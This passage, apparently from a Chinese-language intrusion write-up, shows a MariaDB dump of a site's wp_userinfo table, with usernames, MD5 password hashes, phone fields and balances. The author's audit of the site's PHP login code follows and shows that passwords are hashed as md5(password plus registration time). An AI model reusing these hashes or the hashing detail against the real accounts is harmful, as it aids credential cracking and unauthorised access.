+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> uid</span><span style="color:#D73A49">  |</span><span style="color:#6F42C1"> username</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> upwd</span><span style="color:#D73A49">                             |</span><span style="color:#6F42C1"> utel</span><span style="color:#D73A49">        |</span><span style="color:#6F42C1"> utime</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> agenttype</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> otype</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> ustatus</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> oid</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> address</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> portrait</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> lastlog</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> managername</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> comname</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> comqua</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> rebate</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> feerebate</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> usertype</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> wxtype</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> openid</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> nickname</span><span style="color:#D73A49">  |</span><span style="color:#6F42C1"> logintime</span><span style="color:#D73A49">  |</span><span style="color:#6F42C1"> usermoney</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> userpoint</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> minprice</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#6F42C1">+------+-------------+----------------------------------+-------------+------------+-----------+-------+---------+---------+---------+----------+------------+-------------+---------+--------+--------+-----------+----------+--------+--------+-----------+------------+-----------+-----------+----------+</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1">    1</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> admin</span><span style="color:#D73A49">       |</span><span style="color:#6F42C1"> 35a6b91de813873ca887f5d9b681d180</span><span style="color:#D73A49"> |</span><span style="color:#D73A49">             |</span><span style="color:#6F42C1"> 1480061674</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">         2</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     3</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">       0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1">       NULL</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">        |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> 0</span><span style="color:#D73A49">         |</span><span style="color:#6F42C1">        0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> admin</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">       |</span><span style="color:#6F42C1">      0.00</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      NULL</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     NULL</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> 5632</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 10005632</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> 18aed8d2a11896a6e76180b3d87e64bb</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 123456</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> 1592404993</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">         0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">       0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 1</span><span style="color:#D73A49">       |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> 1597391565</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> admin</span><span style="color:#D73A49">       |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> 0</span><span style="color:#D73A49">         |</span><span style="color:#6F42C1">        0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> www</span><span style="color:#D73A49">       |</span><span style="color:#6F42C1"> 1597391565</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">  11670.00</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      NULL</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     NULL</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> 5634</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 18888888888</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> cf9c0c4996398526203b25d179b60aad</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 18888888888</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 1592469112</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">         0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">       0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 666</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> 1751965186</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> AN</span><span style="color:#D73A49">          |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> 0</span><span style="color:#D73A49">         |</span><span style="color:#6F42C1">        0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> 小可爱</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> 1751965186</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 680278.00</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      NULL</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     NULL</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> 5635</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 10005635</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> f9fb7dcf1f8af5b50235be3cbccf90ee</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 19216813711</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 1752205841</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">         0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">       0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> dashazi</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> 1752205841</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> whatcanisay</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> 0</span><span style="color:#D73A49">         |</span><span style="color:#6F42C1">        0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> root</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> 1752205841</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0.00</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      NULL</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     NULL</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> 5636</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 10005636</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> cafc17ccad5b7523338f81ab912c2750</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 13333333333</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 1752296822</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">         0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">       0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> 1</span><span style="color:#D73A49">       |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> 1752296822</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">        |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#6F42C1"> 0</span><span style="color:#D73A49">         |</span><span style="color:#6F42C1">        0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> NULL</span><span style="color:#D73A49">   |</span><span style="color:#005CC5"> test</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> 1752296822</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      0.00</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">      NULL</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">     NULL</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#6F42C1">+------+-------------+----------------------------------+-------------+------------+-----------+-------+---------+---------+---------+----------+------------+-------------+---------+--------+--------+-----------+----------+--------+--------+-----------+------------+-----------+-----------+----------+</span></span>
+<span class="line"><span style="color:#6F42C1">5</span><span style="color:#032F62"> rows</span><span style="color:#032F62"> in</span><span style="color:#032F62"> set</span><span style="color:#24292E"> (0.000 </span><span style="color:#032F62">sec</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">MariaDB</span><span style="color:#24292E"> [hnymwl_com_utf8]</span><span style="color:#D73A49">></span><span style="color:#24292E"> </span></span>
+<span class="line"></span></code></pre>
+<p>在<code>wp_userinfo</code>表中发现了一个root的密码，将web代码脱下来审计，查看密码加密方式</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#D73A49">public</span><span style="color:#D73A49"> function</span><span style="color:#6F42C1"> login</span><span style="color:#24292E">()</span></span>
+<span class="line"><span style="color:#24292E">    {</span></span>
+<span class="line"><span style="color:#24292E">        $userinfo </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> Db</span><span style="color:#D73A49">::</span><span style="color:#6F42C1">name</span><span style="color:#24292E">(</span><span style="color:#032F62">'userinfo'</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6A737D">    	//判断是否已经登录</span></span>
+<span class="line"><span style="color:#D73A49">    	if</span><span style="color:#24292E"> (</span><span style="color:#005CC5">isset</span><span style="color:#24292E">($_SESSION[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">])) {</span></span>
+<span class="line"><span style="color:#005CC5">    		$this</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">redirect</span><span style="color:#24292E">(</span><span style="color:#032F62">'index/index?token='</span><span style="color:#D73A49">.</span><span style="color:#005CC5">$this</span><span style="color:#D73A49">-></span><span style="color:#24292E">token);</span></span>
+<span class="line"><span style="color:#24292E">    	}</span></span>
+<span class="line"><span style="color:#24292E">        </span></span>
+<span class="line"><span style="color:#D73A49">    	if</span><span style="color:#24292E">(</span><span style="color:#6F42C1">iswechat</span><span style="color:#24292E">() </span><span style="color:#D73A49">&#x26;&#x26;</span><span style="color:#005CC5"> 1</span><span style="color:#D73A49">==</span><span style="color:#005CC5">2</span><span style="color:#24292E">){</span></span>
+<span class="line"><span style="color:#6A737D">    		//微信浏览器 微信登录</span></span>
+<span class="line"><span style="color:#D73A49">    		if</span><span style="color:#24292E">(</span><span style="color:#6F42C1">cookie</span><span style="color:#24292E">(</span><span style="color:#032F62">'wx_info'</span><span style="color:#24292E">)){</span></span>
+<span class="line"><span style="color:#24292E">    			$wx_info </span><span style="color:#D73A49">=</span><span style="color:#6F42C1"> cookie</span><span style="color:#24292E">(</span><span style="color:#032F62">'wx_info'</span><span style="color:#24292E">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">    			$data[</span><span style="color:#032F62">'openid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $wx_info[</span><span style="color:#032F62">'openid'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#24292E">    			$checkuser </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> Db</span><span style="color:#D73A49">::</span><span style="color:#6F42C1">name</span><span style="color:#24292E">(</span><span style="color:#032F62">'userinfo'</span><span style="color:#24292E">)</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">where</span><span style="color:#24292E">($data)</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">value</span><span style="color:#24292E">(</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6A737D">    			//判断是否已经注册</span></span>
+<span class="line"><span style="color:#D73A49">    			if</span><span style="color:#24292E">($checkuser){  </span><span style="color:#6A737D">//已经注册直接記錄session</span></span>
+<span class="line"><span style="color:#24292E">    				$_SESSION[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $checkuser;</span></span>
+<span class="line"><span style="color:#6A737D">                    //更新登录时间</span></span>
+<span class="line"><span style="color:#24292E">                    $t_data[</span><span style="color:#032F62">'logintime'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $t_data[</span><span style="color:#032F62">'lastlog'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> time</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">                    $t_data[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $checkuser;</span></span>
+<span class="line"><span style="color:#24292E">                    $userinfo</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">update</span><span style="color:#24292E">($t_data);</span></span>
+<span class="line"><span style="color:#005CC5">                    $this</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">redirect</span><span style="color:#24292E">(</span><span style="color:#032F62">'index/index'</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">    			}</span><span style="color:#D73A49">else</span><span style="color:#24292E">{  </span><span style="color:#6A737D">//未注册 则注册 默认密碼为123456</span></span>
+<span class="line"><span style="color:#24292E">    				$data[</span><span style="color:#032F62">'nickname'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $wx_info[</span><span style="color:#032F62">'nickname'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#24292E">    				$data[</span><span style="color:#032F62">'utime'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> time</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#6A737D">    				//$data['upwd'] = md5('123456'.$data['utime']);</span></span>
+<span class="line"><span style="color:#24292E">    				$data[</span><span style="color:#032F62">'otype'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 0</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#24292E">    				$data[</span><span style="color:#032F62">'ustatus'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 0</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#24292E">    				$data[</span><span style="color:#032F62">'address'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $wx_info[</span><span style="color:#032F62">'country'</span><span style="color:#24292E">]</span><span style="color:#D73A49">.</span><span style="color:#24292E">$wx_info[</span><span style="color:#032F62">'province'</span><span style="color:#24292E">]</span><span style="color:#D73A49">.</span><span style="color:#24292E">$wx_info[</span><span style="color:#032F62">'city'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#24292E">    				$data[</span><span style="color:#032F62">'portrait'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $wx_info[</span><span style="color:#032F62">'headimgurl'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#D73A49">                    if</span><span style="color:#24292E">(</span><span style="color:#005CC5">isset</span><span style="color:#24292E">($_SESSION[</span><span style="color:#032F62">'fid'</span><span style="color:#24292E">]) </span><span style="color:#D73A49">&#x26;&#x26;</span><span style="color:#24292E"> $_SESSION[</span><span style="color:#032F62">'fid'</span><span style="color:#24292E">]</span><span style="color:#D73A49">></span><span style="color:#005CC5">0</span><span style="color:#24292E">){</span></span>
+<span class="line"><span style="color:#24292E">                        $fid </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $_SESSION[</span><span style="color:#032F62">'fid'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#24292E">                        $fid_info </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $userinfo</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">where</span><span style="color:#24292E">(</span><span style="color:#005CC5">array</span><span style="color:#24292E">(</span><span style="color:#032F62">'uid'</span><span style="color:#D73A49">=></span><span style="color:#24292E">$fid,</span><span style="color:#032F62">'otype'</span><span style="color:#D73A49">=></span><span style="color:#005CC5">101</span><span style="color:#24292E">))</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">value</span><span style="color:#24292E">(</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#D73A49">                        if</span><span style="color:#24292E">($fid_info){</span></span>
+<span class="line"><span style="color:#24292E">                            $data[</span><span style="color:#032F62">'oid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $fid;</span></span>
+<span class="line"><span style="color:#24292E">                        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">                    }</span></span>
+<span class="line"><span style="color:#6A737D">    				//插入数据</span></span>
+<span class="line"><span style="color:#24292E">    				$ids </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $userinfo</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">insertGetId</span><span style="color:#24292E">($data);</span></span>
+<span class="line"><span style="color:#24292E">					$newdata[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $ids;</span></span>
+<span class="line"><span style="color:#24292E">					$newdata[</span><span style="color:#032F62">'username'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 10000000</span><span style="color:#D73A49">+</span><span style="color:#24292E">$ids;</span></span>
+<span class="line"><span style="color:#24292E">					$newids </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $userinfo</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">update</span><span style="color:#24292E">($newdata);</span></span>
+<span class="line"><span style="color:#6A737D">					//清除cookie 为了安全</span></span>
+<span class="line"><span style="color:#6F42C1">					cookie</span><span style="color:#24292E">(</span><span style="color:#032F62">'wx_info'</span><span style="color:#24292E">, </span><span style="color:#005CC5">null</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6A737D">					//記錄session</span></span>
+<span class="line"><span style="color:#24292E">					$_SESSION[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $ids;</span></span>
+<span class="line"><span style="color:#6A737D">                    //更新登录时间</span></span>
+<span class="line"><span style="color:#24292E">                    $t_data[</span><span style="color:#032F62">'logintime'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $t_data[</span><span style="color:#032F62">'lastlog'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> time</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">                    $t_data[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $ids;</span></span>
+<span class="line"><span style="color:#24292E">                    $userinfo</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">update</span><span style="color:#24292E">($t_data);</span></span>
+<span class="line"><span style="color:#005CC5">					$this</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">redirect</span><span style="color:#24292E">(</span><span style="color:#032F62">'login/addpwd?token='</span><span style="color:#D73A49">.</span><span style="color:#005CC5">$this</span><span style="color:#D73A49">-></span><span style="color:#24292E">token);</span></span>
+<span class="line"><span style="color:#24292E">    			}</span></span>
+<span class="line"><span style="color:#24292E">    		}</span><span style="color:#D73A49">else</span><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#005CC5">    			$this</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">redirect</span><span style="color:#24292E">(</span><span style="color:#032F62">'wechat/get_wx_userinfo'</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">    			</span></span>
+<span class="line"><span style="color:#24292E">    		}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">    	}</span><span style="color:#D73A49">else</span><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#6A737D">            //web用戶登录请求</span></span>
+<span class="line"><span style="color:#D73A49">    		if</span><span style="color:#24292E">(</span><span style="color:#6F42C1">input</span><span style="color:#24292E">(</span><span style="color:#032F62">'post.'</span><span style="color:#24292E">)){</span></span>
+<span class="line"><span style="color:#24292E">                $data </span><span style="color:#D73A49">=</span><span style="color:#6F42C1"> input</span><span style="color:#24292E">(</span><span style="color:#032F62">'post.'</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6A737D">                //验证用戶信息</span></span>
+<span class="line"><span style="color:#D73A49">                if</span><span style="color:#24292E">(</span><span style="color:#D73A49">!</span><span style="color:#005CC5">isset</span><span style="color:#24292E">($data[</span><span style="color:#032F62">'username'</span><span style="color:#24292E">]) </span><span style="color:#D73A49">||</span><span style="color:#005CC5"> empty</span><span style="color:#24292E">($data[</span><span style="color:#032F62">'username'</span><span style="color:#24292E">])){</span></span>
+<span class="line"><span style="color:#D73A49">                    return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'请输入用戶名！'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                }</span></span>
+<span class="line"><span style="color:#D73A49">                if</span><span style="color:#24292E">(</span><span style="color:#D73A49">!</span><span style="color:#005CC5">isset</span><span style="color:#24292E">($data[</span><span style="color:#032F62">'upwd'</span><span style="color:#24292E">]) </span><span style="color:#D73A49">||</span><span style="color:#005CC5"> empty</span><span style="color:#24292E">($data[</span><span style="color:#032F62">'upwd'</span><span style="color:#24292E">])){</span></span>
+<span class="line"><span style="color:#D73A49">                    return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'请输入密碼！'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                }</span></span>
+<span class="line"><span style="color:#6A737D">                //查询用戶</span></span>
+<span class="line"><span style="color:#24292E">                </span></span>
+<span class="line"><span style="color:#24292E">                $result </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $userinfo</span></span>
+<span class="line"><span style="color:#D73A49">                -></span><span style="color:#6F42C1">where</span><span style="color:#24292E">(</span><span style="color:#032F62">'username'</span><span style="color:#24292E">,$data[</span><span style="color:#032F62">'username'</span><span style="color:#24292E">])</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">whereOr</span><span style="color:#24292E">(</span><span style="color:#032F62">'nickname'</span><span style="color:#24292E">,$data[</span><span style="color:#032F62">'username'</span><span style="color:#24292E">])</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">whereOr</span><span style="color:#24292E">(</span><span style="color:#032F62">'utel'</span><span style="color:#24292E">,$data[</span><span style="color:#032F62">'username'</span><span style="color:#24292E">])</span></span>
+<span class="line"><span style="color:#D73A49">                        -></span><span style="color:#6F42C1">field</span><span style="color:#24292E">(</span><span style="color:#032F62">"uid,upwd,username,utel,utime,otype,ustatus"</span><span style="color:#24292E">)</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">find</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#6A737D">                //验证用戶</span></span>
+<span class="line"><span style="color:#D73A49">                if</span><span style="color:#24292E">(</span><span style="color:#005CC5">empty</span><span style="color:#24292E">($result)){</span></span>
+<span class="line"><span style="color:#D73A49">                    return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'登录失败,用戶名不存在!'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                }</span><span style="color:#D73A49">else</span><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#D73A49">                    if</span><span style="color:#24292E">(</span><span style="color:#D73A49">!</span><span style="color:#005CC5">in_array</span><span style="color:#24292E">($result[</span><span style="color:#032F62">'otype'</span><span style="color:#24292E">], </span><span style="color:#005CC5">array</span><span style="color:#24292E">(</span><span style="color:#005CC5">0</span><span style="color:#24292E">,</span><span style="color:#005CC5">101</span><span style="color:#24292E">))){  </span><span style="color:#6A737D">//非客户无权登录</span></span>
+<span class="line"><span style="color:#D73A49">                        return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'您无权登录!'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                    }</span></span>
+<span class="line"><span style="color:#D73A49">                    if</span><span style="color:#24292E">($result[</span><span style="color:#032F62">'upwd'</span><span style="color:#24292E">] </span><span style="color:#D73A49">==</span><span style="color:#005CC5"> md5</span><span style="color:#24292E">($data[</span><span style="color:#032F62">'upwd'</span><span style="color:#24292E">]</span><span style="color:#D73A49">.</span><span style="color:#24292E">$result[</span><span style="color:#032F62">'utime'</span><span style="color:#24292E">])){</span></span>
+<span class="line"><span style="color:#24292E">                    </span></span>
+<span class="line"><span style="color:#D73A49">                        if</span><span style="color:#24292E"> ($result[</span><span style="color:#032F62">'ustatus'</span><span style="color:#24292E">]</span><span style="color:#D73A49">==</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">                        {</span></span>
+<span class="line"><span style="color:#24292E">                            $_SESSION[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $result[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#6A737D">                            //更新登录时间</span></span>
+<span class="line"><span style="color:#24292E">                            $t_data[</span><span style="color:#032F62">'logintime'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $t_data[</span><span style="color:#032F62">'lastlog'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> time</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">                            $t_data[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">] </span><span style="color:#D73A49">=</span><span style="color:#24292E"> $result[</span><span style="color:#032F62">'uid'</span><span style="color:#24292E">];</span></span>
+<span class="line"><span style="color:#24292E">                            $userinfo</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">update</span><span style="color:#24292E">($t_data);</span></span>
+<span class="line"><span style="color:#D73A49">                            return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'登录成功!'</span><span style="color:#24292E">,</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"></span>
